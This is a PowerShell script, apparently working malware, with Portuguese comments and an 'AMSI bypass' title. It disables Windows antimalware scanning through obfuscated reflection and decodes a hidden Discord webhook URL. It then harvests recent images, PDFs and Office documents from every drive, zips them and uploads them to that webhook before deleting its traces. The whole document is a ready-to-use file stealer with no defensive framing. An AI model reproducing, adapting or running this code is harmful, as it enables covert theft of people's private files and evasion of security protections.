# [Bypass AMSI Ultra-Ofuscado V18]
$s = [System.Text.Encoding]::UTF8.GetString([byte[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))
$t = [Ref].Assembly.GetType($s)
$f = $t.GetField([System.Text.Encoding]::UTF8.GetString([byte[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100)), "NonPublic,Static")
$f.SetValue($null, $true)

# 1. Configurações e TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wEnc = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NDM2MTE5NTQ0MzE5NjA2Ni9Hb1g5NjE5cmZuUzd6aGE4TUJaelhFZHNSZVNGb3NGWUZidEZ5VmZOUHZ4eWJKWHlYVnc3VGtMUG9qNU0tZzZuV2FYWA=="
$u = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($wEnc))

curl.exe -k -s -F "content=🟢 V18 (Byte-Array) Ativo em $env:COMPUTERNAME" $u

$tempDir = "$env:TEMP\sys_cache_$(Get-Random)"
$exclude = @("C:\Windows", "C:\Program Files", "C:\Program Files (x86)", "C:\ProgramData")
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

# 2. Busca e Cópia (Filtro 30 dias / <15MB)
$e = @('*.jpg', '*.pdf', '*.docx', '*.xlsx')
Get-PSDrive -PSProvider FileSystem | ForEach-Object {
    Get-ChildItem -Path $_.Root -Include $e -Recurse -File -ErrorAction SilentlyContinue | Where-Object {
        $p = $_.FullName
        $isEx = $false; foreach($d in $exclude){if($p.StartsWith($d)){$isEx=$true;break}}
        !$isEx -and $_.LastWriteTime -gt (Get-Date).AddDays(-30) -and $_.Length -lt 15MB
    } | ForEach-Object { Copy-Item $_.FullName -Destination $tempDir -ErrorAction SilentlyContinue }
}

# 3. Compactação e Envio
$zipFile = "$env:TEMP\win_data_bin.tmp"
if ((Get-ChildItem $tempDir).Count -gt 0) {
    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipFile -Force
    curl.exe -k -s -F "file=@$zipFile" $u
}

# Limpeza
Remove-Item $tempDir -Recurse -Force; Remove-Item $zipFile -Force; exit
